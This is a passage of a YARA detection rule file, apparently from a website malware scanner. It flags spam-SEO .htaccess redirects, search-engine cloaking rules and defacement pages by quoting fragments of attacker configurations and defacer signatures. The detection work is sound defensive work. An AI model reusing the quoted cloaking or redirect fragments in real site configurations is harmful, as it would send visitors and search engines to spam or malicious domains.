        $trigger and $htaccess_spamseo_redirect_036_r0
}

private rule PR00169 : trigger
{
    strings:
        $ps0 = "RewriteRule ^(.*)$ wp-content/uploads/"
    condition:
        $ps0
}

private rule PR00170 : trigger
{
    strings:
        $ps0 = "RewriteCond %{REQUEST_URI} \\.htm$"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_037 : spamseo
{
    strings:
        $trigger = "RewriteCond %{REQUEST_URI} !.+/.*"
    condition:
        $trigger and PR00169 and PR00170
}

private rule PR00171 : trigger
{
    strings:
        $ps0 = "RewriteRule ^(cram|exam|prep|notes|pdf|site)-(.*)"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_039 : spamseo
{
    strings:
        $trigger = ".php$ - [L]"
    condition:
        $trigger and PR00171
}

private rule PR00172 : trigger
{
    strings:
        $ps0 = "RewriteCond %{REQUEST_URI} !^.*\\.(jpg|css|js|gif|png|css|js|xml)$ [NC]"
    condition:
        $ps0
}

private rule PR00173 : trigger
{
    strings:
        $ps0 = "RewriteCond %{HTTP_REFERER} (yahoo|msn|aol|bing|google)"
    condition:
        $ps0
}

private rule PR00174 : trigger
{
    strings:
        $ps0 = "RewriteRule ^(.*)$ "
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_040 : spamseo
{
    strings:
        $trigger = "RewriteCond %{HTTP_USER_AGENT} Googlebot [OR]"
    condition:
        $trigger and PR00172 and PR00173 and PR00174
}

private rule PR00175 : trigger
{
    strings:
        $ps0 = "RewriteCond %{HTTP_USER_AGENT} IEMobile [OR]"
    condition:
        $ps0
}

private rule PR00176 : trigger
{
    strings:
        $ps0 = "RewriteRule !.php$ http"
    condition:
        $ps0
}

private rule PR00177 : trigger
{
    strings:
        $ps0 = "RewriteCond %{HTTP_USER_AGENT} BingBot [OR]"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_041 : spamseo
{
    strings:
        $trigger = "RewriteCond %{HTTP_USER_AGENT} Googlebot [OR]"
    condition:
        $trigger and PR00175 and PR00176 and PR00177
}

private rule PR00178 : trigger
{
    strings:
        $ps0 = "RewriteRule ^(.*)--(devata)([0-9"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_042 : spamseo
{
    strings:
        $trigger = ".php$ - [L]"
    condition:
        $trigger and PR00178
}

// MANUAL FIX NECESSARY
private rule PR00179 : trigger
{
    strings:
        $ps0 = "&%{QUERY_STRING}[L]"
    condition:
        $ps0
}

private rule PR00180 : trigger
{
    strings:
        $ps0 = "(.*)--("
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_043 : spamseo
{
    strings:
        $trigger = ".php$ - [L]"
        $htaccess_spamseo_redirect_043_r0 = /RewriteRule \^[^\*\n]*\(\.\*\)--\([\w]+\)[^\$]+\(\.\*\)\$[\s]*\?[\w]+\$[\d]+=\$[\d]+&%\{QUERY_STRING\}\[L\]/
    condition:
        $trigger and PR00179 and PR00100 and PR00180 and $htaccess_spamseo_redirect_043_r0
}

private rule PR00181 : trigger
{
    strings:
        $ps0 = "^([A-Za-z0-9-]+).txt$ http"
    condition:
        $ps0
}

private rule PR00182 : trigger
{
    strings:
        $ps0 = "^([A-Za-z0-9-]+).html$ http"
    condition:
        $ps0
}

private rule PR00183 : trigger
{
    strings:
        $ps0 = "RewriteCond %{REQUEST_FILENAME}"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_044 : spamseo
{
    strings:
        $trigger = "RewriteRule . http"
    condition:
        $trigger and PR00181 and PR00100 and PR00182 and PR00183
}

private rule PR00184 : trigger
{
    strings:
        $ps0 = "RewriteCond %{REQUEST_URI} .____.  [NC]"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_045 : spamseo
{
    strings:
        $trigger = "RewriteCond %{HTTP_REFERER} (google|facebook|twitter"
    condition:
        $trigger and PR00100 and PR00184
}

private rule PR00185 : trigger
{
    strings:
        $ps0 = "RewriteRule . /indeeex.php [L]"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_046 : spamseo
{
    strings:
        $trigger = ".php$ - [L]"
    condition:
        $trigger and PR00100 and PR00185
}

private rule PR00186 : trigger
{
    strings:
        $ps0 = ".php?key=$1 [L]"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_047 : spamseo
{
    strings:
        $trigger = "RewriteRule ^wp\\-content/.*\\.(?:php[1-7]?|pht|phtml?|phps)\\.?$"
    condition:
        $trigger and PR00101 and PR00186
}

private rule PR00187 : trigger
{
    strings:
        $ps0 = "RewriteCond %{HTTP_USER_AGENT} (.*Googlebot.*|.*Yahoo!"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_048 : spamseo
{
    strings:
        $trigger = ".php(.*) http:"
    condition:
        $trigger and PR00187 and PR00124
}

private rule PR00188 : trigger
{
    strings:
        $ps0 = "RewriteCond %{REQUEST_URI} !/(ss)\\.php [NC]"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_049 : spamseo
{
    strings:
        $trigger = "RewriteCond %{REQUEST_URI} !/(cc)\\.php [NC]"
    condition:
        $trigger and PR00097 and PR00188
}

rule htaccess_spamseo_redirect_050 : spamseo
{
    strings:
        $trigger = "RewriteRule ^([A-Za-z0-9-]+).html$"
    condition:
        $trigger
}

rule htaccess_spamseo_redirect_051 : spamseo
{
    strings:
        $trigger = "RewriteRule ^(.*).html$"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule htaccess_spamseo_redirect_053 : spamseo
{
    strings:
        $trigger = "RewriteCond %{HTTP_USER_AGENT} ("
        $htaccess_spamseo_redirect_053_r0 = /RewriteCond\s*\%{HTTP_USER_AGENT}\s*\((bing\||yahoo\||google\|)+[^\)]+\)\s*\[/
        $htaccess_spamseo_redirect_053_r1 = /(RewriteCond %\{HTTP_[\w]+\} \(((bing|google|yahoo|msn|aol)\|){3,}[^\n]*[\s]*){2,}(RewriteCond %[^\n]+[\s]*)*RewriteRule[^\n]+L[^\s]*/
    condition:
        $trigger and PR00133 and $htaccess_spamseo_redirect_053_r0 and $htaccess_spamseo_redirect_053_r1
}

rule htaccess_spamseo_redirect_054 : spamseo
{
    strings:
        $trigger = "getyourprizenow"
    condition:
        $trigger and PR00100
}

// MANUAL FIX NECESSARY
private rule PR00189 : trigger
{
    strings:
        $ps0 = "RewriteRule . default.php [L,S=10000]"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_055 : spamseo
{
    strings:
        $trigger = "%{HTTP_USER_AGENT}"
        $htaccess_spamseo_redirect_055_r0 = /RewriteCond\s*\%{HTTP_USER_AGENT}\s*\((bing\||yahoo\||google\|)+[^\)]+\)\s*\[/
    condition:
        $trigger and PR00189 and $htaccess_spamseo_redirect_055_r0
}

rule htaccess_spamseo_redirect_057 : spamseo
{
    strings:
        $trigger = "RewriteRule ^.+\\.txt$ https://bit.ly"
    condition:
        $trigger
}

private rule PR00190 : trigger
{
    strings:
        $ps0 = "RewriteCond %{HTTP_REFERER} (yahoo"
    condition:
        $ps0
}

private rule PR00191 : trigger
{
    strings:
        $ps0 = ".inc.php [L,S=10000]"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_058 : spamseo
{
    strings:
        $trigger = ".php$ - [L]"
    condition:
        $trigger and PR00100 and PR00190 and PR00191
}

rule htaccess_spamseo_redirect_059 : spamseo
{
    strings:
        $trigger = "smsite=$"
    condition:
        $trigger and PR00100
}

private rule PR00192 : trigger
{
    strings:
        $ps0 = "RewriteCond %{HTTP_USER_AGENT} (android|iphone|ipod|ipad) [NC]"
    condition:
        $ps0
}

private rule PR00193 : trigger
{
    strings:
        $ps0 = "RewriteCond %{HTTP:X-Wap-Profile} ^.+$ [OR]"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_060 : spamseo
{
    strings:
        $trigger = "RewriteRule ^(.*)$ http"
    condition:
        $trigger and PR00192 and PR00193
}

rule htaccess_spamseo_redirect_gen_007 : spamseo
{
    strings:
        $trigger = "/go.php?sid="
    condition:
        $trigger and PR00097
}

private rule PR00194 : trigger
{
    strings:
        $ps0 = ".cgi?default [L,R=302]"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_gen_013_05 : spamseo
{
    strings:
        $trigger = "Rewrite"
    condition:
        $trigger and PR00194
}

rule htaccess_spamseo_redirect_gen_013_06 : spamseo
{
    strings:
        $trigger = "RewriteCond %{HTTP:x-operamini-phone-ua} .+ [NC,OR]"
    condition:
        $trigger and PR00124
}

rule htaccess_spamseo_redirect_gen_016_02 : spamseo
{
    strings:
        $trigger = "RewriteRule ^(.*)$ http://194.6.233"
    condition:
        $trigger
}

rule htaccess_spamseo_redirect_gen_024 : spamseo
{
    strings:
        $trigger = "http://osta-x.ru"
    condition:
        $trigger and PR00097
}

rule htaccess_spamseo_redirect_gen_030 : spamseo
{
    strings:
        $trigger = "RewriteRule ^([a-zA-Z0-9]+)-(.*)-([0-9]+)\\.htm$ file.php?$1=$2-$3 [L]"
    condition:
        $trigger
}

rule htaccess_spamseo_redirect_gen_031 : spamseo
{
    strings:
        $trigger = "futility-few.php"
    condition:
        $trigger and PR00097
}

private rule PR00195 : trigger
{
    strings:
        $ps0 = ")_.*_.*-.*"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_gen_032 : spamseo
{
    strings:
        $trigger = " ?$1$3=$4&%{QUERY_STRING}[L]"
    condition:
        $trigger and PR00100 and PR00195
}

// MANUAL FIX NECESSARY
rule htaccess_spamseo_redirect_gen_034 : spamseo
{
    strings:
        $trigger = "\x09\x09ErrorDocument 40"
        $htaccess_spamseo_redirect_gen_034_r0 = /40\d[\s]*http/
    condition:
        $trigger and $htaccess_spamseo_redirect_gen_034_r0
}

// MANUAL FIX NECESSARY
private rule PR00196 : trigger
{
    strings:
        $ps0 = "404 http://toptanbayangiyim.com"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_gen_035 : spamseo
{
    strings:
        $trigger = "Document 40"
        $htaccess_spamseo_redirect_gen_035_r0 = /40\d[\s]*http/
    condition:
        $trigger and PR00196 and $htaccess_spamseo_redirect_gen_035_r0
}

rule htaccess_spamseo_redirect_gen_036 : spamseo
{
    strings:
        $trigger = "text/vnd.wap.wml|application/vnd.wap.xhtml\\+xml"
    condition:
        $trigger and PR00124
}

// MANUAL FIX NECESSARY
rule htaccess_spamseo_redirect_gen_037 : spamseo
{
    strings:
        $trigger = "RewriteRule .* "
        $htaccess_spamseo_redirect_gen_037_r0 = /RewriteEngine\s+[Oo][Nn]\s+RewriteCond\s+%{HTTP:Accept-Language}\s*\(\w+\)\s+\[[^]]+\]\s+RewriteRule \.\* /
    condition:
        $trigger and PR00100 and PR00157 and $htaccess_spamseo_redirect_gen_037_r0
}

private rule PR00197 : trigger
{
    strings:
        $ps0 = "^.*[-/]n(\\d+)-.*$ index\\.php?id=$1&%{QUERY_STRING}"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_gen_038 : spamseo
{
    strings:
        $trigger = "<IfModule mod_rewrite.c>"
    condition:
        $trigger and PR00100 and PR00197
}

// MANUAL FIX NECESSARY
rule htaccess_spamseo_redirect_gen_040 : spamseo
{
    strings:
        $trigger = "Rewrite"
        $htaccess_spamseo_redirect_gen_040_r0 = /RewriteCond %.HTTP_USER_AGENT}.{300,}\[NC,OR\][\s]*RewriteCond %.HTTP_USER_AGENT} \^.{1000,}\[NC\][\s]*RewriteRule \^\$ http[^,]+\[R,L\]/
    condition:
        $trigger and PR00162 and $htaccess_spamseo_redirect_gen_040_r0
}

private rule PR00198 : trigger
{
    strings:
        $ps0 = "RewriteRule ^(.*)$ https://tinyurl.com/"
    condition:
        $ps0
}

private rule PR00199 : trigger
{
    strings:
        $ps0 = "{HTTP:X-Wap-Profile}"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_gen_042 : spamseo
{
    strings:
        $trigger = "vnd.wap.wml"
    condition:
        $trigger and PR00198 and PR00162 and PR00199
}

private rule PR00200 : trigger
{
    strings:
        $ps0 = "mob-update.ru"
    condition:
        $ps0
}

rule htaccess_spamseo_rediret_001_010 : spamseo
{
    strings:
        $trigger = "Rewrite"
    condition:
        $trigger and PR00200
}

private rule PR00201 : trigger
{
    strings:
        $ps0 = "updatemaster.net"
    condition:
        $ps0
}

rule htaccess_spamseo_rediret_001_011 : spamseo
{
    strings:
        $trigger = "Rewrite"
    condition:
        $trigger and PR00201
}

private rule PR00202 : trigger
{
    strings:
        $ps0 = "serverjump"
    condition:
        $ps0
}

rule htaccess_spamseo_serverjump_001 : spamseo
{
    strings:
        $trigger = "Rewrite"
    condition:
        $trigger and PR00202
}

// MANUAL FIX NECESSARY
rule htaccess_spamseo_suspiciousrewrite_003 : spamseo
{
    strings:
        $trigger = "RewriteRule ^"
        $htaccess_spamseo_suspiciousrewrite_003_r0 = /RewriteRule \^[\d]{6,}.\(\.\*\)\$[\s]*[^[]+\.php[\s]*\[QSA,L\]/
    condition:
        $trigger and $htaccess_spamseo_suspiciousrewrite_003_r0
}

private rule PR00203 : trigger
{
    strings:
        $ps0 = "if (file_exists("
    condition:
        $ps0
}

private rule PR00204 : trigger
{
    strings:
        $ps0 = "fclose($"
    condition:
        $ps0
}

private rule PR00205 : trigger
{
    strings:
        $ps0 = "0777);"
    condition:
        $ps0
}

rule htaccess_spamseo_suspiciousrewrite_006 : spamseo
{
    strings:
        $trigger = "fwrite($htout, \"RewriteEngine On"
    condition:
        $trigger and PR00097 and PR00203 and PR00204 and PR00205
}

private rule PR00206 : trigger
{
    strings:
        $ps0 = "*) wp-404.php"
    condition:
        $ps0
}

rule htaccess_spamseo_wp404_001 : spamseo
{
    strings:
        $trigger = "Rewrite"
    condition:
        $trigger and PR00206
}

private rule PR00207 : trigger
{
    strings:
        $ps0 = ")$ wp-404.php"
    condition:
        $ps0
}

rule htaccess_spamseo_wp404_002 : spamseo
{
    strings:
        $trigger = "Rewrite"
    condition:
        $trigger and PR00207
}

rule htaccess_spamseo_wplicence_001 : spamseo
{
    strings:
        $trigger = "RewriteRule ^info/(.*)$ wp-licence.php [L]"
    condition:
        $trigger
}

private rule PR00208 : trigger
{
    strings:
        $ps0 = "([0-9]+)\\.html$ wp-content/"
    condition:
        $ps0
}

rule htaccess_spamseo_wp_content_rewrite_001 : spamseo
{
    strings:
        $trigger = "Rewrite"
    condition:
        $trigger and PR00208
}

rule html_defaced_0xfans_001 : defaced
{
    strings:
        $trigger = "<title>0xfans"
    condition:
        $trigger
}

private rule PR00209 : trigger
{
    strings:
        $ps0 = "HACKED BY Absent"
    condition:
        $ps0
}

rule html_defaced_Absent_001 : defaced
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00209
}

private rule PR00210 : trigger
{
    strings:
        $ps0 = ">[#] Achan Dot ID"
    condition:
        $ps0
}

rule html_defaced_AchanDotID_001 : defaced
{
    strings:
        $trigger = "Hack"
    condition:
        $trigger and PR00210
}

private rule PR00211 : trigger
{
    strings:
        $ps0 = "We are Anonymous"
    condition:
        $ps0
}

rule html_defaced_anonymous_001 : defaced
{
    strings:
        $trigger = "ocument.write"
    condition:
        $trigger and PR00211
}

rule html_defaced_berdendangc0de_001 : defaced
{
    strings:
        $trigger = "BerdendangC0de"
    condition:
        $trigger and PR00042
}

private rule PR00212 : trigger
{
    strings:
        $ps0 = "H!tl3r007"
    condition:
        $ps0
}

rule html_defaced_BFA_001_001 : defaced
{
    strings:
        $trigger = "Hack"
    condition:
        $trigger and PR00212
}

rule html_defaced_BFA_001_02 : defaced
{
    strings:
        $trigger = "Hitler007"
    condition:
        $trigger and PR00042
}

private rule PR00213 : trigger
{
    strings:
        $ps0 = "<link rel=\"shortcut icon\" href=\"http://error-404.ucoz.com/bghh.jpg\" type=\"image/x-icon\""
    condition:
        $ps0
}

rule html_defaced_BGHH_001 : defaced
{
    strings:
        $trigger = "Hack"
    condition:
        $trigger and PR00213
}

rule html_defaced_BGHH_001_002 : defaced
{
    strings:
        $trigger = "<title>Emau Jinak</title>"
    condition:
        $trigger
}

rule html_defaced_bloodsec_001 : defaced
{
    strings:
        $trigger = ">BloodSec International"
    condition:
        $trigger and PR00042
}

private rule PR00214 : trigger
{
    strings:
        $ps0 = "<u><b>Fucked By C0der"
    condition:
        $ps0
}

rule html_defaced_c0der_002 : defaced
{
    strings:
        $trigger = "=\"http://"
    condition:
        $trigger and PR00214
}

private rule PR00215 : trigger
{
    strings:
        $ps0 = "<!-- Cpanel404 -->"
    condition:
        $ps0
}

rule html_defaced_Cpanel404_001 : defaced
{
    strings:
        $trigger = "ocument.write"
    condition:
        $trigger and PR00215
}

rule html_defaced_Cyb3rSw0rd_001 : defaced
{
    strings:
        $trigger = "alert('Access Denied! Protected By Cyb3r Sw0rd!')"
    condition:
        $trigger
}

rule html_defaced_cyber_hats_crew_001 : defaced
{
    strings:
        $trigger = "<title>Cyber Hats Crew"
    condition:
        $trigger
}

rule html_defaced_CyberHeroez_001 : defaced
{
    strings:
        $trigger = "href=\"http://cyberheroez.ddos.im/ico.png"
    condition:
        $trigger and PR00050
}

rule html_defaced_cyberpunkshackers_001 : defaced
{
    strings:
        $trigger = "\"Cyberpunks Hackers 2007"
    condition:
        $trigger and PR00042
}

rule html_defaced_devil_security_crew_001 : defaced
{
    strings:
        $trigger = "Devil Security Crew<"
    condition:
        $trigger and PR00042
}

rule html_defaced_DkBrazil_001 : defaced
{
    strings:
        $trigger = "Gtz : BEC  - Defacer killers - Bonde Dos killers"
    condition:
        $trigger
}

private rule PR00216 : trigger
{
    strings:
        $ps0 = "Jagad Dot ID"
    condition:
        $ps0
}

rule html_defaced_DotID_001 : defaced
{
    strings:
        $trigger = "hack"
    condition:
        $trigger and PR00216
}

rule html_defaced_expiredpastebin_001 : defaced
{
    strings:
        $trigger = "<title>Pastebin.com - Page Removed"
    condition:
        $trigger
}

private rule PR00217 : trigger
{
    strings:
        $ps0 = "GeNErAL"
    condition:
        $ps0
}

rule html_defaced_GeNErAL_001 : defaced
{
    strings:
        $trigger = "Hack"
    condition:
        $trigger and PR00217
}

// MANUAL FIX NECESSARY
rule html_defaced_generic_007 : defaced
{
    strings:
        $trigger = ">"
        $html_defaced_generic_007_r0 = /[Hh][Aa4][Cc][Kk]/
        $html_defaced_generic_007_w1 = /[Hh]acking [Aa]ttempt/
        $html_defaced_generic_007_w2 = /[Pp]ro[Pp]hoto/
        $html_defaced_generic_007_w3 = ">Hacker(s)?"
        $html_defaced_generic_007_w4 = "ackenbe"
        $html_defaced_generic_007_w5 = "ackett"
        $html_defaced_generic_007_w6 = "ackney"
        $html_defaced_generic_007_w7 = ">Stop Hackers?"
        $html_defaced_generic_007_w8 = "/webalizer/"
        $html_defaced_generic_007_w9 = "acksaw"
        $html_defaced_generic_007_w10 = "ccutron"
        $html_defaced_generic_007_w11 = "ackworth"
        $html_defaced_generic_007_w12 = "Thacker"
        $html_defaced_generic_007_w13 = "hackerscreek"
        $html_defaced_generic_007_w14 = "<!--mstheme-->"
        $html_defaced_generic_007_w15 = "hack saw"
        $html_defaced_generic_007_w16 = "ackberry"
        $html_defaced_generic_007_w17 = "Growth Hacking"
        $html_defaced_generic_007_w18 = "Grant Hacking"
        $html_defaced_generic_007_w19 = "<!-- This website is like a Rocket, isn't it? Performance optimized by WP Rocket"
        $html_defaced_generic_007_r20 = /(<title|<center|<h[\d]|<strong|<b|<TITLE|<CENTER|<H[\d]|<STRONG|<B)>[^';<]{0,30}[Hh][Aa4][Cc][Kk][Ee3Ii1][AaDdNnRr\s]([DdGg\s])?([Oo\s])?/
	$html_defaced_generic_007_r21 = "Get 100% Protection from Hacker"
    condition:
        $trigger and $html_defaced_generic_007_r0 and not $html_defaced_generic_007_w1 and not $html_defaced_generic_007_w2 and not $html_defaced_generic_007_w3 and not $html_defaced_generic_007_w4 and not $html_defaced_generic_007_w5 and not $html_defaced_generic_007_w6 and not $html_defaced_generic_007_w7 and not $html_defaced_generic_007_w8 and not $html_defaced_generic_007_w9 and not $html_defaced_generic_007_w10 and not $html_defaced_generic_007_w11 and not $html_defaced_generic_007_w12 and not $html_defaced_generic_007_w13 and not $html_defaced_generic_007_w14 and not $html_defaced_generic_007_w15 and not $html_defaced_generic_007_w16 and not $html_defaced_generic_007_w17 and not $html_defaced_generic_007_w18 and not $html_defaced_generic_007_w19 and $html_defaced_generic_007_r20 and not $html_defaced_generic_007_r21
}

// MANUAL FIX NECESSARY
rule html_defaced_generic_009 : defaced
{
    strings:
        $trigger = ">"
        $html_defaced_generic_009_r0 = /[Hh][Aa4][Cc][Kk]/
        $html_defaced_generic_009_w1 = /[Hh]acking [Aa]ttempt/
        $html_defaced_generic_009_w2 = /[Pp]ro[Pp]hoto/
        $html_defaced_generic_009_w3 = ">Hacker(s)?"
        $html_defaced_generic_009_w4 = "ackenbe"
        $html_defaced_generic_009_w5 = "ackett"
        $html_defaced_generic_009_w6 = "ackney"
        $html_defaced_generic_009_w7 = ">Stop Hackers?"
        $html_defaced_generic_009_w8 = "/webalizer/"
        $html_defaced_generic_009_w9 = "acksaw"
        $html_defaced_generic_009_w10 = "ccutron"
        $html_defaced_generic_009_w11 = "ackworth"
        $html_defaced_generic_009_w12 = "Thacker"
        $html_defaced_generic_009_w13 = "hackerscreek"
        $html_defaced_generic_009_w14 = "<!--mstheme-->"
        $html_defaced_generic_009_w15 = "hack saw"
        $html_defaced_generic_009_w16 = "ackberry"
        $html_defaced_generic_009_w17 = "Growth Hacking"
        $html_defaced_generic_009_w18 = "Grant Hacking"
        $html_defaced_generic_009_w19 = "<!-- This website is like a Rocket, isn't it? Performance optimized by WP Rocket"
        $html_defaced_generic_009_r20 = /<(font|FONT)[^>]+[^\n<]{0,50}[^\w][Hh][Aa4][Cc][Kk][Ee3Ii1\s]/
    condition:
        $trigger and $html_defaced_generic_009_r0 and not $html_defaced_generic_009_w1 and not $html_defaced_generic_009_w2 and not $html_defaced_generic_009_w3 and not $html_defaced_generic_009_w4 and not $html_defaced_generic_009_w5 and not $html_defaced_generic_009_w6 and not $html_defaced_generic_009_w7 and not $html_defaced_generic_009_w8 and not $html_defaced_generic_009_w9 and not $html_defaced_generic_009_w10 and not $html_defaced_generic_009_w11 and not $html_defaced_generic_009_w12 and not $html_defaced_generic_009_w13 and not $html_defaced_generic_009_w14 and not $html_defaced_generic_009_w15 and not $html_defaced_generic_009_w16 and not $html_defaced_generic_009_w17 and not $html_defaced_generic_009_w18 and not $html_defaced_generic_009_w19 and $html_defaced_generic_009_r20
}

// MANUAL FIX NECESSARY
rule html_defaced_generic_010 : defaced
{
    strings:
        $trigger = "ck"
        $html_defaced_generic_010_r0 = /[Hh][Aa4][Cc][Kk]/
        $html_defaced_generic_010_w1 = "Hacked by Andreas Rehm"
        $html_defaced_generic_010_w2 = "Hacked by Lance Rushing"
        $html_defaced_generic_010_w3 = "hacked by kudo to"
        $html_defaced_generic_010_w4 = "hacked by Marco Cimmino"
        $html_defaced_generic_010_w5 = "Coppermine Photo Gallery"
        $html_defaced_generic_010_w6 = "New York Times hacked"
        $html_defaced_generic_010_w7 = "### Hacked by SDIC: M17n,"
        $html_defaced_generic_010_w8 = "HACKED BY BE REBEL TO WORK WITH WEBPACK"
        $html_defaced_generic_010_r9 = /(^|\n).{0,50}[Hh][Aa4][Cc][Kk][Ee3][Dd][\s_][Bb][Yy][\s_]/
    condition:
        $trigger and $html_defaced_generic_010_r0 and not $html_defaced_generic_010_w1 and not $html_defaced_generic_010_w2 and not $html_defaced_generic_010_w3 and not $html_defaced_generic_010_w4 and not $html_defaced_generic_010_w5 and not $html_defaced_generic_010_w6 and not $html_defaced_generic_010_w7 and not $html_defaced_generic_010_w8 and $html_defaced_generic_010_r9
}

// MANUAL FIX NECESSARY
rule html_defaced_generic_012 : defaced
{
    strings:
        $trigger = "styl"
        $html_defaced_generic_012_r0 = /<[titleTITLE]{5}>[^<]+[hackedHACKED43]{6} [byBY]{2}[^<]+<.[title|TITLE]{5}>/
    condition:
        $trigger and $html_defaced_generic_012_r0
}

rule html_defaced_generic_020 : defaced
{
    strings:
        $trigger = "%22Hacked%20By%20"
    condition:
        $trigger
}

private rule PR00218 : trigger
{
    strings:
        $ps0 = "<TITLE>./pwned</TITLE>"
    condition:
        $ps0
}

rule html_defaced_generic_022 : defaced
{
    strings:
        $trigger = "Hack"
    condition:
        $trigger and PR00218
}

rule html_defaced_generic_025 : defaced
{
    strings:
        $trigger = "[+] We Hack This Site To Inform About"
    condition:
        $trigger
}

private rule PR00219 : trigger
{
    strings:
        $ps0 = "<meta name=\"keywords\" content=\"kmq@hotmail.com kna@hotmail.com"
    condition:
        $ps0
}

rule html_defaced_generic_026 : defaced
{
    strings:
        $trigger = "Hack"
    condition:
        $trigger and PR00219
}

rule html_defaced_generic_029 : defaced
{
    strings:
        $trigger = "<title> ~OWNED"
    condition:
        $trigger
}

rule html_defaced_generic_031 : defaced
{
    strings:
        $trigger = "var msg  = \"This Website Hacked By"
    condition:
        $trigger
}

rule html_defaced_generic_032 : defaced
{
    strings:
        $trigger = "<title>#DEFACED By"
    condition:
        $trigger
}

private rule PR00220 : trigger
{
    strings:
        $ps0 = "EMEGE SAYGIN OLSUN BIRAZ"
    condition:
        $ps0
}

rule html_defaced_generic_044 : defaced
{
    strings:
        $trigger = "Hack"
    condition:
        $trigger and PR00220
}

rule html_defaced_generic_046 : defaced
{
    strings:
        $trigger = "<title>-=[ The Crows Crew ]=-</title>"
    condition:
        $trigger
}

rule html_defaced_generic_051 : defaced
{
    strings:
        $trigger = "ESTE SITIO A SIDO HACKEADO by [YEI ZETA]"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_051_001 : defaced
{
    strings:
        $trigger = "ESTE SITIO ESTA EN NUESTRAS MANOS."
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_054 : defaced
{
    strings:
        $trigger = "<title>Moroccan Attacker"
    condition:
        $trigger
}

private rule PR00221 : trigger
{
    strings:
        $ps0 = ">Bangladesh Cyber Army"
    condition:
        $ps0
}

rule html_defaced_generic_059 : defaced
{
    strings:
        $trigger = "Hack"
    condition:
        $trigger and PR00221
}

rule html_defaced_generic_060 : defaced
{
    strings:
        $trigger = "<title>OP Payback"
    condition:
        $trigger
}

rule html_defaced_generic_062 : defaced
{
    strings:
        $trigger = "<title>K4RDAN4DAM"
    condition:
        $trigger
}

rule html_defaced_generic_067 : defaced
{
    strings:
        $trigger = "[+] Indonesian Defacer Newbie"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_068 : defaced
{
    strings:
        $trigger = "Arabia Hackers<"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_070 : defaced
{
    strings:
        $trigger = "+++An Indian Hacker"
    condition:
        $trigger
}

private rule PR00222 : trigger
{
    strings:
        $ps0 = "Deface"
    condition:
        $ps0
}

rule html_defaced_generic_072 : defaced
{
    strings:
        $trigger = "<h1>PwnEd by : "
    condition:
        $trigger and PR00222
}

rule html_defaced_generic_073 : defaced
{
    strings:
        $trigger = ">ACCESO DENEGADO, DESFACEADA"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_074 : defaced
{
    strings:
        $trigger = "<title>0wn3d "
    condition:
        $trigger
}

rule html_defaced_generic_075 : defaced
{
    strings:
        $trigger = ">./Albanian Attackers<"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_075_02 : defaced
{
    strings:
        $trigger = ">./DeFaceD<"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_076 : defaced
{
    strings:
        $trigger = "<title>[!] STAMPED BY"
    condition:
        $trigger
}

rule html_defaced_generic_079 : defaced
{
    strings:
        $trigger = ">.: ! Owned"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_080 : defaced
{
    strings:
        $trigger = "/AzerbaijanDefacersGroup/\""
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_081 : defaced
{
    strings:
        $trigger = ">[!] Own3d"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_082 : defaced
{
    strings:
        $trigger = ">Pawned By"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_084 : defaced
{
    strings:
        $trigger = "<title>F.B.S!"
    condition:
        $trigger
}

private rule PR00223 : trigger
{
    strings:
        $ps0 = "Team Was here [+] <"
    condition:
        $ps0
}

rule html_defaced_generic_085 : defaced
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR00223
}

rule html_defaced_generic_086 : defaced
{
    strings:
        $trigger = ">Anniversary Cinta :*<"
    condition:
        $trigger and PR00042
}

private rule PR00224 : trigger
{
    strings:
        $ps0 = "ocument.write"
    condition:
        $ps0
}

rule html_defaced_generic_087 : defaced
{
    strings:
        $trigger = "HACKTEAM<"
    condition:
        $trigger and PR00224
}

rule html_defaced_generic_091 : defaced
{
    strings:
        $trigger = "<title>You Lose"
    condition:
        $trigger
}

rule html_defaced_generic_092 : defaced
{
    strings:
        $trigger = "<title>.::[+] Defaced"
    condition:
        $trigger
}

rule html_defaced_generic_093 : defaced
{
    strings:
        $trigger = "Hacker Rulez"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_095 : defaced
{
    strings:
        $trigger = "Tested by ./cLaw"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_097 : defaced
{
    strings:
        $trigger = "Orang Govlog :v"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_099 : defaced
{
    strings:
        $trigger = "<title>Ow3nd"
    condition:
        $trigger
}

rule html_defaced_generic_101 : defaced
{
    strings:
        $trigger = "<title>[ Fast Deface ]"
    condition:
        $trigger
}

rule html_defaced_generic_102 : defaced
{
    strings:
        $trigger = "<title>#Pwned</title>"
    condition:
        $trigger
}

rule html_defaced_generic_103 : defaced
{
    strings:
        $trigger = "<title>[Mister][Spy]"
    condition:
        $trigger
}

rule html_defaced_generic_104 : defaced
{
    strings:
        $trigger = "<title>Hcked By"
    condition:
        $trigger
}

